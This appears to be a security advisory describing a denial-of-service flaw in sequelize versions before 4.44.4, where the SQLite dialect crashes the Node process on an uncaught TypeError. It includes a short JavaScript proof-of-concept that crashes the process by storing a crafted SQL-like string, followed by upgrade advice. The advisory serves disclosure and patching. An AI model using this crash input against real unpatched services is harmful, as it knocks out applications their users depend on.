title: "Denial of Service in sequelize"
description: "Versions of `sequelize` prior to 4.44.4 are vulnerable to Denial of
  Service (DoS). The SQLite dialect fails to catch a `TypeError` exception for the
  `results` variable. The `results` value may be undefined and trigger the error on
  a `.map` call. This may allow attackers to submit malicious input that forces the
  exception and crashes the Node process.  \n\nThe following proof-of-concept crashes
  the Node process:  \n```\nconst Sequelize = require('sequelize');\n\nconst sequelize
  = new Sequelize({\n\tdialect: 'sqlite',\n\tstorage: 'database.sqlite'\n});\n\nconst
  TypeError = sequelize.define('TypeError', {\n\tname: Sequelize.STRING,\n});\n\nTypeError.sync({force:
  true}).then(() => {\n\treturn TypeError.create({name: \"SELECT tbl_name FROM sqlite_master\"});\n});\n```\n\n\n##
  Recommendation\n\nUpgrade to version 4.44.4 or later."
